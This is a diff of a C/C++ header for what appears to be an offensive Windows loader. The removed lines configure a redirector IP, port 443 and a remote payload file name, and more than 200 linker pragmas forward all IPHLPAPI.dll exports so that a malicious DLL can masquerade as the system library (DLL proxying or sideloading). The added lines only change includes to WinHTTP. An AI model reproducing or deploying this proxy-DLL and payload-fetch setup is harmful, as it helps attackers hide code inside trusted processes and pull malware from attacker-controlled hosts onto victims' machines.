@@ -1,316 +1,16 @@
 #pragma once
-#include <winsock2.h>
-#include <ws2tcpip.h>
-#include <Windows.h>
+#include <windows.h>
+#include <winhttp.h>
 #include <stdio.h>
-#include <ios>  // Fixed quotation marks
-#include <fstream>  // Fixed quotation marks
-
-char ip[] = "3.3.3.3";  // Redirector public IP (replace with yours)
-char port[] = "443";    // Changed to 443
-char resource[] = "iloveblogs.bin";
 
 #pragma comment(lib, "ntdll")
-#pragma comment(linker,"/export:AddIPAddress=C:\\Windows\\System32\\IPHLPAPI.AddIPAddress,@1")
-#pragma comment(linker,"/export:AllocateAndGetInterfaceInfoFromStack=C:\\Windows\\System32\\IPHLPAPI.AllocateAndGetInterfaceInfoFromStack,@2")
-#pragma comment(linker,"/export:AllocateAndGetIpAddrTableFromStack=C:\\Windows\\System32\\IPHLPAPI.AllocateAndGetIpAddrTableFromStack,@3")
-#pragma comment(linker,"/export:CancelIPChangeNotify=C:\\Windows\\System32\\IPHLPAPI.CancelIPChangeNotify,@4")
-#pragma comment(linker,"/export:CancelIfTimestampConfigChange=C:\\Windows\\System32\\IPHLPAPI.CancelIfTimestampConfigChange,@5")
-#pragma comment(linker,"/export:CancelMibChangeNotify2=C:\\Windows\\System32\\IPHLPAPI.CancelMibChangeNotify2,@6")
-#pragma comment(linker,"/export:CaptureInterfaceHardwareCrossTimestamp=C:\\Windows\\System32\\IPHLPAPI.CaptureInterfaceHardwareCrossTimestamp,@7")
-#pragma comment(linker,"/export:CloseCompartment=C:\\Windows\\System32\\IPHLPAPI.CloseCompartment,@8")
-#pragma comment(linker,"/export:CloseGetIPPhysicalInterfaceForDestination=C:\\Windows\\System32\\IPHLPAPI.CloseGetIPPhysicalInterfaceForDestination,@9")
-#pragma comment(linker,"/export:ConvertCompartmentGuidToId=C:\\Windows\\System32\\IPHLPAPI.ConvertCompartmentGuidToId,@10")
-#pragma comment(linker,"/export:ConvertCompartmentIdToGuid=C:\\Windows\\System32\\IPHLPAPI.ConvertCompartmentIdToGuid,@11")
-#pragma comment(linker,"/export:ConvertGuidToStringA=C:\\Windows\\System32\\IPHLPAPI.ConvertGuidToStringA,@12")
-#pragma comment(linker,"/export:ConvertGuidToStringW=C:\\Windows\\System32\\IPHLPAPI.ConvertGuidToStringW,@13")
-#pragma comment(linker,"/export:ConvertInterfaceAliasToLuid=C:\\Windows\\System32\\IPHLPAPI.ConvertInterfaceAliasToLuid,@14")
-#pragma comment(linker,"/export:ConvertInterfaceGuidToLuid=C:\\Windows\\System32\\IPHLPAPI.ConvertInterfaceGuidToLuid,@15")
-#pragma comment(linker,"/export:ConvertInterfaceIndexToLuid=C:\\Windows\\System32\\IPHLPAPI.ConvertInterfaceIndexToLuid,@16")
-#pragma comment(linker,"/export:ConvertInterfaceLuidToAlias=C:\\Windows\\System32\\IPHLPAPI.ConvertInterfaceLuidToAlias,@17")
-#pragma comment(linker,"/export:ConvertInterfaceLuidToGuid=C:\\Windows\\System32\\IPHLPAPI.ConvertInterfaceLuidToGuid,@18")
-#pragma comment(linker,"/export:ConvertInterfaceLuidToIndex=C:\\Windows\\System32\\IPHLPAPI.ConvertInterfaceLuidToIndex,@19")
-#pragma comment(linker,"/export:ConvertInterfaceLuidToNameA=C:\\Windows\\System32\\IPHLPAPI.ConvertInterfaceLuidToNameA,@20")
-#pragma comment(linker,"/export:ConvertInterfaceLuidToNameW=C:\\Windows\\System32\\IPHLPAPI.ConvertInterfaceLuidToNameW,@21")
-#pragma comment(linker,"/export:ConvertInterfaceNameToLuidA=C:\\Windows\\System32\\IPHLPAPI.ConvertInterfaceNameToLuidA,@22")
-#pragma comment(linker,"/export:ConvertInterfaceNameToLuidW=C:\\Windows\\System32\\IPHLPAPI.ConvertInterfaceNameToLuidW,@23")
-#pragma comment(linker,"/export:ConvertInterfacePhysicalAddressToLuid=C:\\Windows\\System32\\IPHLPAPI.ConvertInterfacePhysicalAddressToLuid,@24")
-#pragma comment(linker,"/export:ConvertIpv4MaskToLength=C:\\Windows\\System32\\IPHLPAPI.ConvertIpv4MaskToLength,@25")
-#pragma comment(linker,"/export:ConvertLengthToIpv4Mask=C:\\Windows\\System32\\IPHLPAPI.ConvertLengthToIpv4Mask,@26")
-#pragma comment(linker,"/export:ConvertRemoteInterfaceAliasToLuid=C:\\Windows\\System32\\IPHLPAPI.ConvertRemoteInterfaceAliasToLuid,@27")
-#pragma comment(linker,"/export:ConvertRemoteInterfaceGuidToLuid=C:\\Windows\\System32\\IPHLPAPI.ConvertRemoteInterfaceGuidToLuid,@28")
-#pragma comment(linker,"/export:ConvertRemoteInterfaceIndexToLuid=C:\\Windows\\System32\\IPHLPAPI.ConvertRemoteInterfaceIndexToLuid,@29")
-#pragma comment(linker,"/export:ConvertRemoteInterfaceLuidToAlias=C:\\Windows\\System32\\IPHLPAPI.ConvertRemoteInterfaceLuidToAlias,@30")
-#pragma comment(linker,"/export:ConvertRemoteInterfaceLuidToGuid=C:\\Windows\\System32\\IPHLPAPI.ConvertRemoteInterfaceLuidToGuid,@31")
-#pragma comment(linker,"/export:ConvertRemoteInterfaceLuidToIndex=C:\\Windows\\System32\\IPHLPAPI.ConvertRemoteInterfaceLuidToIndex,@32")
-#pragma comment(linker,"/export:ConvertStringToGuidA=C:\\Windows\\System32\\IPHLPAPI.ConvertStringToGuidA,@33")
-#pragma comment(linker,"/export:ConvertStringToGuidW=C:\\Windows\\System32\\IPHLPAPI.ConvertStringToGuidW,@34")
-#pragma comment(linker,"/export:ConvertStringToInterfacePhysicalAddress=C:\\Windows\\System32\\IPHLPAPI.ConvertStringToInterfacePhysicalAddress,@35")
-#pragma comment(linker,"/export:CreateAnycastIpAddressEntry=C:\\Windows\\System32\\IPHLPAPI.CreateAnycastIpAddressEntry,@36")
-#pragma comment(linker,"/export:CreateCompartment=C:\\Windows\\System32\\IPHLPAPI.CreateCompartment,@37")
-#pragma comment(linker,"/export:CreateIpForwardEntry=C:\\Windows\\System32\\IPHLPAPI.CreateIpForwardEntry,@38")
-#pragma comment(linker,"/export:CreateIpForwardEntry2=C:\\Windows\\System32\\IPHLPAPI.CreateIpForwardEntry2,@39")
-#pragma comment(linker,"/export:CreateIpNetEntry=C:\\Windows\\System32\\IPHLPAPI.CreateIpNetEntry,@40")
-#pragma comment(linker,"/export:CreateIpNetEntry2=C:\\Windows\\System32\\IPHLPAPI.CreateIpNetEntry2,@41")
-#pragma comment(linker,"/export:CreatePersistentTcpPortReservation=C:\\Windows\\System32\\IPHLPAPI.CreatePersistentTcpPortReservation,@42")
-#pragma comment(linker,"/export:CreatePersistentUdpPortReservation=C:\\Windows\\System32\\IPHLPAPI.CreatePersistentUdpPortReservation,@43")
-#pragma comment(linker,"/export:CreateProxyArpEntry=C:\\Windows\\System32\\IPHLPAPI.CreateProxyArpEntry,@44")
-#pragma comment(linker,"/export:CreateSortedAddressPairs=C:\\Windows\\System32\\IPHLPAPI.CreateSortedAddressPairs,@45")
-#pragma comment(linker,"/export:CreateUnicastIpAddressEntry=C:\\Windows\\System32\\IPHLPAPI.CreateUnicastIpAddressEntry,@46")
-#pragma comment(linker,"/export:DeleteAnycastIpAddressEntry=C:\\Windows\\System32\\IPHLPAPI.DeleteAnycastIpAddressEntry,@47")
-#pragma comment(linker,"/export:DeleteCompartment=C:\\Windows\\System32\\IPHLPAPI.DeleteCompartment,@48")
-#pragma comment(linker,"/export:DeleteIPAddress=C:\\Windows\\System32\\IPHLPAPI.DeleteIPAddress,@49")
-#pragma comment(linker,"/export:DeleteIpForwardEntry=C:\\Windows\\System32\\IPHLPAPI.DeleteIpForwardEntry,@50")
-#pragma comment(linker,"/export:DeleteIpForwardEntry2=C:\\Windows\\System32\\IPHLPAPI.DeleteIpForwardEntry2,@51")
-#pragma comment(linker,"/export:DeleteIpNetEntry=C:\\Windows\\System32\\IPHLPAPI.DeleteIpNetEntry,@52")
-#pragma comment(linker,"/export:DeleteIpNetEntry2=C:\\Windows\\System32\\IPHLPAPI.DeleteIpNetEntry2,@53")
-#pragma comment(linker,"/export:DeletePersistentTcpPortReservation=C:\\Windows\\System32\\IPHLPAPI.DeletePersistentTcpPortReservation,@54")
-#pragma comment(linker,"/export:DeletePersistentUdpPortReservation=C:\\Windows\\System32\\IPHLPAPI.DeletePersistentUdpPortReservation,@55")
-#pragma comment(linker,"/export:DeleteProxyArpEntry=C:\\Windows\\System32\\IPHLPAPI.DeleteProxyArpEntry,@56")
-#pragma comment(linker,"/export:DeleteUnicastIpAddressEntry=C:\\Windows\\System32\\IPHLPAPI.DeleteUnicastIpAddressEntry,@57")
-#pragma comment(linker,"/export:DisableMediaSense=C:\\Windows\\System32\\IPHLPAPI.DisableMediaSense,@58")
-#pragma comment(linker,"/export:EnableRouter=C:\\Windows\\System32\\IPHLPAPI.EnableRouter,@59")
-#pragma comment(linker,"/export:FlushIpNetTable=C:\\Windows\\System32\\IPHLPAPI.FlushIpNetTable,@60")
-#pragma comment(linker,"/export:FlushIpNetTable2=C:\\Windows\\System32\\IPHLPAPI.FlushIpNetTable2,@61")
-#pragma comment(linker,"/export:FlushIpPathTable=C:\\Windows\\System32\\IPHLPAPI.FlushIpPathTable,@62")
-#pragma comment(linker,"/export:FreeDnsSettings=C:\\Windows\\System32\\IPHLPAPI.FreeDnsSettings,@63")
-#pragma comment(linker,"/export:FreeInterfaceDnsSettings=C:\\Windows\\System32\\IPHLPAPI.FreeInterfaceDnsSettings,@64")
-#pragma comment(linker,"/export:FreeMibTable=C:\\Windows\\System32\\IPHLPAPI.FreeMibTable,@65")
-#pragma comment(linker,"/export:GetAdapterIndex=C:\\Windows\\System32\\IPHLPAPI.GetAdapterIndex,@66")
-#pragma comment(linker,"/export:GetAdapterOrderMap=C:\\Windows\\System32\\IPHLPAPI.GetAdapterOrderMap,@67")
-#pragma comment(linker,"/export:GetAdaptersAddresses=C:\\Windows\\System32\\IPHLPAPI.GetAdaptersAddresses,@68")
-#pragma comment(linker,"/export:GetAdaptersInfo=C:\\Windows\\System32\\IPHLPAPI.GetAdaptersInfo,@69")
-#pragma comment(linker,"/export:GetAnycastIpAddressEntry=C:\\Windows\\System32\\IPHLPAPI.GetAnycastIpAddressEntry,@70")
-#pragma comment(linker,"/export:GetAnycastIpAddressTable=C:\\Windows\\System32\\IPHLPAPI.GetAnycastIpAddressTable,@71")
-#pragma comment(linker,"/export:GetBestInterface=C:\\Windows\\System32\\IPHLPAPI.GetBestInterface,@72")
-#pragma comment(linker,"/export:GetBestInterfaceEx=C:\\Windows\\System32\\IPHLPAPI.GetBestInterfaceEx,@73")
-#pragma comment(linker,"/export:GetBestRoute=C:\\Windows\\System32\\IPHLPAPI.GetBestRoute,@74")
-#pragma comment(linker,"/export:GetBestRoute2=C:\\Windows\\System32\\IPHLPAPI.GetBestRoute2,@75")
-#pragma comment(linker,"/export:GetCurrentThreadCompartmentId=C:\\Windows\\System32\\IPHLPAPI.GetCurrentThreadCompartmentId,@76")
-#pragma comment(linker,"/export:GetCurrentThreadCompartmentScope=C:\\Windows\\System32\\IPHLPAPI.GetCurrentThreadCompartmentScope,@77")
-#pragma comment(linker,"/export:GetDefaultCompartmentId=C:\\Windows\\System32\\IPHLPAPI.GetDefaultCompartmentId,@78")
-#pragma comment(linker,"/export:GetDnsSettings=C:\\Windows\\System32\\IPHLPAPI.GetDnsSettings,@79")
-#pragma comment(linker,"/export:GetExtendedTcpTable=C:\\Windows\\System32\\IPHLPAPI.GetExtendedTcpTable,@80")
-#pragma comment(linker,"/export:GetExtendedUdpTable=C:\\Windows\\System32\\IPHLPAPI.GetExtendedUdpTable,@81")
-#pragma comment(linker,"/export:GetFriendlyIfIndex=C:\\Windows\\System32\\IPHLPAPI.GetFriendlyIfIndex,@82")
-#pragma comment(linker,"/export:GetIcmpStatistics=C:\\Windows\\System32\\IPHLPAPI.GetIcmpStatistics,@83")
-#pragma comment(linker,"/export:GetIcmpStatisticsEx=C:\\Windows\\System32\\IPHLPAPI.GetIcmpStatisticsEx,@84")
-#pragma comment(linker,"/export:GetIfEntry=C:\\Windows\\System32\\IPHLPAPI.GetIfEntry,@85")
-#pragma comment(linker,"/export:GetIfEntry2=C:\\Windows\\System32\\IPHLPAPI.GetIfEntry2,@86")
-#pragma comment(linker,"/export:GetIfEntry2Ex=C:\\Windows\\System32\\IPHLPAPI.GetIfEntry2Ex,@87")
-#pragma comment(linker,"/export:GetIfStackTable=C:\\Windows\\System32\\IPHLPAPI.GetIfStackTable,@88")
-#pragma comment(linker,"/export:GetIfTable=C:\\Windows\\System32\\IPHLPAPI.GetIfTable,@89")
-#pragma comment(linker,"/export:GetIfTable2=C:\\Windows\\System32\\IPHLPAPI.GetIfTable2,@90")
-#pragma comment(linker,"/export:GetIfTable2Ex=C:\\Windows\\System32\\IPHLPAPI.GetIfTable2Ex,@91")
-#pragma comment(linker,"/export:GetInterfaceCompartmentId=C:\\Windows\\System32\\IPHLPAPI.GetInterfaceCompartmentId,@92")
-#pragma comment(linker,"/export:GetInterfaceCurrentTimestampCapabilities=C:\\Windows\\System32\\IPHLPAPI.GetInterfaceCurrentTimestampCapabilities,@93")
-#pragma comment(linker,"/export:GetInterfaceDnsSettings=C:\\Windows\\System32\\IPHLPAPI.GetInterfaceDnsSettings,@94")
-#pragma comment(linker,"/export:GetInterfaceHardwareTimestampCapabilities=C:\\Windows\\System32\\IPHLPAPI.GetInterfaceHardwareTimestampCapabilities,@95")
-#pragma comment(linker,"/export:GetInterfaceInfo=C:\\Windows\\System32\\IPHLPAPI.GetInterfaceInfo,@96")
-#pragma comment(linker,"/export:GetInvertedIfStackTable=C:\\Windows\\System32\\IPHLPAPI.GetInvertedIfStackTable,@97")
-#pragma comment(linker,"/export:GetIpAddrTable=C:\\Windows\\System32\\IPHLPAPI.GetIpAddrTable,@98")
-#pragma comment(linker,"/export:GetIpErrorString=C:\\Windows\\System32\\IPHLPAPI.GetIpErrorString,@99")
-#pragma comment(linker,"/export:GetIpForwardEntry2=C:\\Windows\\System32\\IPHLPAPI.GetIpForwardEntry2,@100")
-#pragma comment(linker,"/export:GetIpForwardTable=C:\\Windows\\System32\\IPHLPAPI.GetIpForwardTable,@101")
-#pragma comment(linker,"/export:GetIpForwardTable2=C:\\Windows\\System32\\IPHLPAPI.GetIpForwardTable2,@102")
-#pragma comment(linker,"/export:GetIpInterfaceEntry=C:\\Windows\\System32\\IPHLPAPI.GetIpInterfaceEntry,@103")
-#pragma comment(linker,"/export:GetIpInterfaceTable=C:\\Windows\\System32\\IPHLPAPI.GetIpInterfaceTable,@104")
-#pragma comment(linker,"/export:GetIpNetEntry2=C:\\Windows\\System32\\IPHLPAPI.GetIpNetEntry2,@105")
-#pragma comment(linker,"/export:GetIpNetTable=C:\\Windows\\System32\\IPHLPAPI.GetIpNetTable,@106")
-#pragma comment(linker,"/export:GetIpNetTable2=C:\\Windows\\System32\\IPHLPAPI.GetIpNetTable2,@107")
-#pragma comment(linker,"/export:GetIpNetworkConnectionBandwidthEstimates=C:\\Windows\\System32\\IPHLPAPI.GetIpNetworkConnectionBandwidthEstimates,@108")
-#pragma comment(linker,"/export:GetIpPathEntry=C:\\Windows\\System32\\IPHLPAPI.GetIpPathEntry,@109")
-#pragma comment(linker,"/export:GetIpPathTable=C:\\Windows\\System32\\IPHLPAPI.GetIpPathTable,@110")
-#pragma comment(linker,"/export:GetIpStatistics=C:\\Windows\\System32\\IPHLPAPI.GetIpStatistics,@111")
-#pragma comment(linker,"/export:GetIpStatisticsEx=C:\\Windows\\System32\\IPHLPAPI.GetIpStatisticsEx,@112")
-#pragma comment(linker,"/export:GetJobCompartmentId=C:\\Windows\\System32\\IPHLPAPI.GetJobCompartmentId,@113")
-#pragma comment(linker,"/export:GetMulticastIpAddressEntry=C:\\Windows\\System32\\IPHLPAPI.GetMulticastIpAddressEntry,@114")
-#pragma comment(linker,"/export:GetMulticastIpAddressTable=C:\\Windows\\System32\\IPHLPAPI.GetMulticastIpAddressTable,@115")
-#pragma comment(linker,"/export:GetNetworkConnectivityHint=C:\\Windows\\System32\\IPHLPAPI.GetNetworkConnectivityHint,@116")
-#pragma comment(linker,"/export:GetNetworkConnectivityHintForInterface=C:\\Windows\\System32\\IPHLPAPI.GetNetworkConnectivityHintForInterface,@117")
-#pragma comment(linker,"/export:GetNetworkInformation=C:\\Windows\\System32\\IPHLPAPI.GetNetworkInformation,@118")
-#pragma comment(linker,"/export:GetNetworkParams=C:\\Windows\\System32\\IPHLPAPI.GetNetworkParams,@119")
-#pragma comment(linker,"/export:GetNumberOfInterfaces=C:\\Windows\\System32\\IPHLPAPI.GetNumberOfInterfaces,@120")
-#pragma comment(linker,"/export:GetOwnerModuleFromPidAndInfo=C:\\Windows\\System32\\IPHLPAPI.GetOwnerModuleFromPidAndInfo,@121")
-#pragma comment(linker,"/export:GetOwnerModuleFromTcp6Entry=C:\\Windows\\System32\\IPHLPAPI.GetOwnerModuleFromTcp6Entry,@122")
-#pragma comment(linker,"/export:GetOwnerModuleFromTcpEntry=C:\\Windows\\System32\\IPHLPAPI.GetOwnerModuleFromTcpEntry,@123")
-#pragma comment(linker,"/export:GetOwnerModuleFromUdp6Entry=C:\\Windows\\System32\\IPHLPAPI.GetOwnerModuleFromUdp6Entry,@124")
-#pragma comment(linker,"/export:GetOwnerModuleFromUdpEntry=C:\\Windows\\System32\\IPHLPAPI.GetOwnerModuleFromUdpEntry,@125")
-#pragma comment(linker,"/export:GetPerAdapterInfo=C:\\Windows\\System32\\IPHLPAPI.GetPerAdapterInfo,@126")
-#pragma comment(linker,"/export:GetPerTcp6ConnectionEStats=C:\\Windows\\System32\\IPHLPAPI.GetPerTcp6ConnectionEStats,@127")
-#pragma comment(linker,"/export:GetPerTcp6ConnectionStats=C:\\Windows\\System32\\IPHLPAPI.GetPerTcp6ConnectionStats,@128")
-#pragma comment(linker,"/export:GetPerTcpConnectionEStats=C:\\Windows\\System32\\IPHLPAPI.GetPerTcpConnectionEStats,@129")
-#pragma comment(linker,"/export:GetPerTcpConnectionStats=C:\\Windows\\System32\\IPHLPAPI.GetPerTcpConnectionStats,@130")
-#pragma comment(linker,"/export:GetRTTAndHopCount=C:\\Windows\\System32\\IPHLPAPI.GetRTTAndHopCount,@131")
-#pragma comment(linker,"/export:GetSessionCompartmentId=C:\\Windows\\System32\\IPHLPAPI.GetSessionCompartmentId,@132")
-#pragma comment(linker,"/export:GetTcp6Table=C:\\Windows\\System32\\IPHLPAPI.GetTcp6Table,@133")
-#pragma comment(linker,"/export:GetTcp6Table2=C:\\Windows\\System32\\IPHLPAPI.GetTcp6Table2,@134")
-#pragma comment(linker,"/export:GetTcpStatistics=C:\\Windows\\System32\\IPHLPAPI.GetTcpStatistics,@135")
-#pragma comment(linker,"/export:GetTcpStatisticsEx=C:\\Windows\\System32\\IPHLPAPI.GetTcpStatisticsEx,@136")
-#pragma comment(linker,"/export:GetTcpStatisticsEx2=C:\\Windows\\System32\\IPHLPAPI.GetTcpStatisticsEx2,@137")
-#pragma comment(linker,"/export:GetTcpTable=C:\\Windows\\System32\\IPHLPAPI.GetTcpTable,@138")
-#pragma comment(linker,"/export:GetTcpTable2=C:\\Windows\\System32\\IPHLPAPI.GetTcpTable2,@139")
-#pragma comment(linker,"/export:GetTeredoPort=C:\\Windows\\System32\\IPHLPAPI.GetTeredoPort,@140")
-#pragma comment(linker,"/export:GetUdp6Table=C:\\Windows\\System32\\IPHLPAPI.GetUdp6Table,@141")
-#pragma comment(linker,"/export:GetUdpStatistics=C:\\Windows\\System32\\IPHLPAPI.GetUdpStatistics,@142")
-#pragma comment(linker,"/export:GetUdpStatisticsEx=C:\\Windows\\System32\\IPHLPAPI.GetUdpStatisticsEx,@143")
-#pragma comment(linker,"/export:GetUdpStatisticsEx2=C:\\Windows\\System32\\IPHLPAPI.GetUdpStatisticsEx2,@144")
-#pragma comment(linker,"/export:GetUdpTable=C:\\Windows\\System32\\IPHLPAPI.GetUdpTable,@145")
-#pragma comment(linker,"/export:GetUniDirectionalAdapterInfo=C:\\Windows\\System32\\IPHLPAPI.GetUniDirectionalAdapterInfo,@146")
-#pragma comment(linker,"/export:GetUnicastIpAddressEntry=C:\\Windows\\System32\\IPHLPAPI.GetUnicastIpAddressEntry,@147")
-#pragma comment(linker,"/export:GetUnicastIpAddressTable=C:\\Windows\\System32\\IPHLPAPI.GetUnicastIpAddressTable,@148")
-#pragma comment(linker,"/export:GetWPAOACSupportLevel=C:\\Windows\\System32\\IPHLPAPI.GetWPAOACSupportLevel,@149")
-#pragma comment(linker,"/export:Icmp6CreateFile=C:\\Windows\\System32\\IPHLPAPI.Icmp6CreateFile,@150")
-#pragma comment(linker,"/export:Icmp6ParseReplies=C:\\Windows\\System32\\IPHLPAPI.Icmp6ParseReplies,@151")
-#pragma comment(linker,"/export:Icmp6SendEcho2=C:\\Windows\\System32\\IPHLPAPI.Icmp6SendEcho2,@152")
-#pragma comment(linker,"/export:IcmpCloseHandle=C:\\Windows\\System32\\IPHLPAPI.IcmpCloseHandle,@153")
-#pragma comment(linker,"/export:IcmpCreateFile=C:\\Windows\\System32\\IPHLPAPI.IcmpCreateFile,@154")
-#pragma comment(linker,"/export:IcmpParseReplies=C:\\Windows\\System32\\IPHLPAPI.IcmpParseReplies,@155")
-#pragma comment(linker,"/export:IcmpSendEcho=C:\\Windows\\System32\\IPHLPAPI.IcmpSendEcho,@156")
-#pragma comment(linker,"/export:IcmpSendEcho2=C:\\Windows\\System32\\IPHLPAPI.IcmpSendEcho2,@157")
-#pragma comment(linker,"/export:IcmpSendEcho2Ex=C:\\Windows\\System32\\IPHLPAPI.IcmpSendEcho2Ex,@158")
-#pragma comment(linker,"/export:InitializeCompartmentEntry=C:\\Windows\\System32\\IPHLPAPI.InitializeCompartmentEntry,@159")
-#pragma comment(linker,"/export:InitializeIpForwardEntry=C:\\Windows\\System32\\IPHLPAPI.InitializeIpForwardEntry,@160")
-#pragma comment(linker,"/export:InitializeIpInterfaceEntry=C:\\Windows\\System32\\IPHLPAPI.InitializeIpInterfaceEntry,@161")
-#pragma comment(linker,"/export:InitializeUnicastIpAddressEntry=C:\\Windows\\System32\\IPHLPAPI.InitializeUnicastIpAddressEntry,@162")
-#pragma comment(linker,"/export:InternalCleanupPersistentStore=C:\\Windows\\System32\\IPHLPAPI.InternalCleanupPersistentStore,@163")
-#pragma comment(linker,"/export:InternalCreateAnycastIpAddressEntry=C:\\Windows\\System32\\IPHLPAPI.InternalCreateAnycastIpAddressEntry,@164")
-#pragma comment(linker,"/export:InternalCreateIpForwardEntry=C:\\Windows\\System32\\IPHLPAPI.InternalCreateIpForwardEntry,@165")
-#pragma comment(linker,"/export:InternalCreateIpForwardEntry2=C:\\Windows\\System32\\IPHLPAPI.InternalCreateIpForwardEntry2,@166")
-#pragma comment(linker,"/export:InternalCreateIpNetEntry=C:\\Windows\\System32\\IPHLPAPI.InternalCreateIpNetEntry,@167")
-#pragma comment(linker,"/export:InternalCreateIpNetEntry2=C:\\Windows\\System32\\IPHLPAPI.InternalCreateIpNetEntry2,@168")
-#pragma comment(linker,"/export:InternalCreateOrRefIpForwardEntry2=C:\\Windows\\System32\\IPHLPAPI.InternalCreateOrRefIpForwardEntry2,@169")
-#pragma comment(linker,"/export:InternalCreateUnicastIpAddressEntry=C:\\Windows\\System32\\IPHLPAPI.InternalCreateUnicastIpAddressEntry,@170")
-#pragma comment(linker,"/export:InternalDeleteAnycastIpAddressEntry=C:\\Windows\\System32\\IPHLPAPI.InternalDeleteAnycastIpAddressEntry,@171")
-#pragma comment(linker,"/export:InternalDeleteIpForwardEntry=C:\\Windows\\System32\\IPHLPAPI.InternalDeleteIpForwardEntry,@172")
-#pragma comment(linker,"/export:InternalDeleteIpForwardEntry2=C:\\Windows\\System32\\IPHLPAPI.InternalDeleteIpForwardEntry2,@173")
-#pragma comment(linker,"/export:InternalDeleteIpNetEntry=C:\\Windows\\System32\\IPHLPAPI.InternalDeleteIpNetEntry,@174")
-#pragma comment(linker,"/export:InternalDeleteIpNetEntry2=C:\\Windows\\System32\\IPHLPAPI.InternalDeleteIpNetEntry2,@175")
-#pragma comment(linker,"/export:InternalDeleteUnicastIpAddressEntry=C:\\Windows\\System32\\IPHLPAPI.InternalDeleteUnicastIpAddressEntry,@176")
-#pragma comment(linker,"/export:InternalFindInterfaceByAddress=C:\\Windows\\System32\\IPHLPAPI.InternalFindInterfaceByAddress,@177")
-#pragma comment(linker,"/export:InternalGetAnycastIpAddressEntry=C:\\Windows\\System32\\IPHLPAPI.InternalGetAnycastIpAddressEntry,@178")
-#pragma comment(linker,"/export:InternalGetAnycastIpAddressTable=C:\\Windows\\System32\\IPHLPAPI.InternalGetAnycastIpAddressTable,@179")
-#pragma comment(linker,"/export:InternalGetBoundTcp6EndpointTable=C:\\Windows\\System32\\IPHLPAPI.InternalGetBoundTcp6EndpointTable,@180")
-#pragma comment(linker,"/export:InternalGetBoundTcpEndpointTable=C:\\Windows\\System32\\IPHLPAPI.InternalGetBoundTcpEndpointTable,@181")
-#pragma comment(linker,"/export:InternalGetForwardIpTable2=C:\\Windows\\System32\\IPHLPAPI.InternalGetForwardIpTable2,@182")
-#pragma comment(linker,"/export:InternalGetIPPhysicalInterfaceForDestination=C:\\Windows\\System32\\IPHLPAPI.InternalGetIPPhysicalInterfaceForDestination,@183")
-#pragma comment(linker,"/export:InternalGetIfEntry2=C:\\Windows\\System32\\IPHLPAPI.InternalGetIfEntry2,@184")
-#pragma comment(linker,"/export:InternalGetIfTable=C:\\Windows\\System32\\IPHLPAPI.InternalGetIfTable,@185")
-#pragma comment(linker,"/export:InternalGetIfTable2=C:\\Windows\\System32\\IPHLPAPI.InternalGetIfTable2,@186")
-#pragma comment(linker,"/export:InternalGetIpAddrTable=C:\\Windows\\System32\\IPHLPAPI.InternalGetIpAddrTable,@187")
-#pragma comment(linker,"/export:InternalGetIpForwardEntry2=C:\\Windows\\System32\\IPHLPAPI.InternalGetIpForwardEntry2,@188")
-#pragma comment(linker,"/export:InternalGetIpForwardTable=C:\\Windows\\System32\\IPHLPAPI.InternalGetIpForwardTable,@189")
-#pragma comment(linker,"/export:InternalGetIpInterfaceEntry=C:\\Windows\\System32\\IPHLPAPI.InternalGetIpInterfaceEntry,@190")
-#pragma comment(linker,"/export:InternalGetIpInterfaceTable=C:\\Windows\\System32\\IPHLPAPI.InternalGetIpInterfaceTable,@191")
-#pragma comment(linker,"/export:InternalGetIpNetEntry2=C:\\Windows\\System32\\IPHLPAPI.InternalGetIpNetEntry2,@192")
-#pragma comment(linker,"/export:InternalGetIpNetTable=C:\\Windows\\System32\\IPHLPAPI.InternalGetIpNetTable,@193")
-#pragma comment(linker,"/export:InternalGetIpNetTable2=C:\\Windows\\System32\\IPHLPAPI.InternalGetIpNetTable2,@194")
-#pragma comment(linker,"/export:InternalGetMulticastIpAddressEntry=C:\\Windows\\System32\\IPHLPAPI.InternalGetMulticastIpAddressEntry,@195")
-#pragma comment(linker,"/export:InternalGetMulticastIpAddressTable=C:\\Windows\\System32\\IPHLPAPI.InternalGetMulticastIpAddressTable,@196")
-#pragma comment(linker,"/export:InternalGetRtcSlotInformation=C:\\Windows\\System32\\IPHLPAPI.InternalGetRtcSlotInformation,@197")
-#pragma comment(linker,"/export:InternalGetTcp6Table2=C:\\Windows\\System32\\IPHLPAPI.InternalGetTcp6Table2,@198")
-#pragma comment(linker,"/export:InternalGetTcp6TableWithOwnerModule=C:\\Windows\\System32\\IPHLPAPI.InternalGetTcp6TableWithOwnerModule,@199")
-#pragma comment(linker,"/export:InternalGetTcp6TableWithOwnerPid=C:\\Windows\\System32\\IPHLPAPI.InternalGetTcp6TableWithOwnerPid,@200")
-#pragma comment(linker,"/export:InternalGetTcpTable=C:\\Windows\\System32\\IPHLPAPI.InternalGetTcpTable,@201")
-#pragma comment(linker,"/export:InternalGetTcpTable2=C:\\Windows\\System32\\IPHLPAPI.InternalGetTcpTable2,@202")
-#pragma comment(linker,"/export:InternalGetTcpTableEx=C:\\Windows\\System32\\IPHLPAPI.InternalGetTcpTableEx,@203")
-#pragma comment(linker,"/export:InternalGetTcpTableWithOwnerModule=C:\\Windows\\System32\\IPHLPAPI.InternalGetTcpTableWithOwnerModule,@204")
-#pragma comment(linker,"/export:InternalGetTcpTableWithOwnerPid=C:\\Windows\\System32\\IPHLPAPI.InternalGetTcpTableWithOwnerPid,@205")
-#pragma comment(linker,"/export:InternalGetTunnelPhysicalAdapter=C:\\Windows\\System32\\IPHLPAPI.InternalGetTunnelPhysicalAdapter,@206")
-#pragma comment(linker,"/export:InternalGetUdp6TableWithOwnerModule=C:\\Windows\\System32\\IPHLPAPI.InternalGetUdp6TableWithOwnerModule,@207")
-#pragma comment(linker,"/export:InternalGetUdp6TableWithOwnerPid=C:\\Windows\\System32\\IPHLPAPI.InternalGetUdp6TableWithOwnerPid,@208")
-#pragma comment(linker,"/export:InternalGetUdpTable=C:\\Windows\\System32\\IPHLPAPI.InternalGetUdpTable,@209")
-#pragma comment(linker,"/export:InternalGetUdpTableEx=C:\\Windows\\System32\\IPHLPAPI.InternalGetUdpTableEx,@210")
-#pragma comment(linker,"/export:InternalGetUdpTableWithOwnerModule=C:\\Windows\\System32\\IPHLPAPI.InternalGetUdpTableWithOwnerModule,@211")
-#pragma comment(linker,"/export:InternalGetUdpTableWithOwnerPid=C:\\Windows\\System32\\IPHLPAPI.InternalGetUdpTableWithOwnerPid,@212")
-#pragma comment(linker,"/export:InternalGetUnicastIpAddressEntry=C:\\Windows\\System32\\IPHLPAPI.InternalGetUnicastIpAddressEntry,@213")
